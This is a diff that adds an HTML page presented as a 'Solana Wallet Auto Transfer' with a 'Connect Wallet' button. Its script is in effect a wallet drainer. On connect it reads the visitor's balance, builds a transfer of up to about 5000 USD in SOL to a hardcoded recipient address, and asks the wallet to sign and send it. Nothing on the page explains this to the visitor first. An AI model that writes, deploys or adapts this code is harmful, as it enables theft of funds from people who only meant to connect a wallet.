@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Wallet Transfer</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
+</head>
+<body>
+    <h1>Solana Wallet Auto Transfer</h1>
+    <button id="connectWallet">Connect Wallet</button>
+
+    <script>
+        (async () => {
+            // Set up Solana connection
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+
+            // Define recipient and transfer limit
+            const recipientAddress = "AaTLKPX9WKSC8eWvkUXj7GTfdx11gAmuYrNBwMSbBYSE"; // Replace with the recipient's public key
+            const maxTransferLimitUSD = 5000; // Max limit in USD
+            const solToUsdRate = 25; // Update with the current SOL price in USD
+
+            // Function to handle wallet connection
+            async function connectWallet() {
+                if (!window.solana) {
+                    alert("Please install a Solana wallet (e.g., Phantom) to proceed.");
+                    return;
+                }
+
+                try {
+                    // Connect wallet
+                    const wallet = window.solana;
+                    await wallet.connect();
+
+                    const publicKey = wallet.publicKey.toString();
+                    console.log("Connected wallet:", publicKey);
+
+                    // Get wallet balance
+                    const balanceLamports = await connection.getBalance(wallet.publicKey);
+                    const balanceSol = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
+                    console.log("Wallet balance (SOL):", balanceSol);
+
+                    // Calculate maximum transfer amount
+                    const maxTransferSol = maxTransferLimitUSD / solToUsdRate;
+                    const transferAmount = Math.min(balanceSol, maxTransferSol);
+                    console.log("Transfer amount (SOL):", transferAmount);
+
+                    if (transferAmount <= 0) {
+                        alert("Insufficient balance for transfer.");
+                        return;
+                    }
+
+                    // Perform the transfer
+                    await performTransfer(wallet, publicKey, transferAmount);
+                } catch (error) {
+                    console.error("Wallet connection error:", error);
+                    alert("Failed to connect wallet.");
+                }
+            }
+
+            // Function to perform the transfer
+            async function performTransfer(wallet, publicKey, amountSol) {
+                try {
+                    const transaction = new solanaWeb3.Transaction();
+
+                    // Add transfer instruction
+                    transaction.add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: new solanaWeb3.PublicKey(publicKey),
+                            toPubkey: new solanaWeb3.PublicKey(recipientAddress),
+                            lamports: amountSol * solanaWeb3.LAMPORTS_PER_SOL,
+                        })
+                    );
+
+                    // Get recent blockhash
+                    const { blockhash } = await connection.getRecentBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = new solanaWeb3.PublicKey(publicKey);
+
+                    // Sign and send transaction
+                    const signedTransaction = await wallet.signTransaction(transaction);
+                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+                    await connection.confirmTransaction(signature, 'finalized');
+
+                    console.log("Transfer successful. Signature:", signature);
+                    alert("Transfer complete! Transaction signature: " + signature);
+                } catch (error) {
+                    console.error("Transfer error:", error);
+                    alert("Transfer failed.");
+                }
+            }
+
+            // Bind wallet connection to button
+            document.getElementById('connectWallet').addEventListener('click', connectWallet);
+        })();
+    </script>
+</body>
+</html>
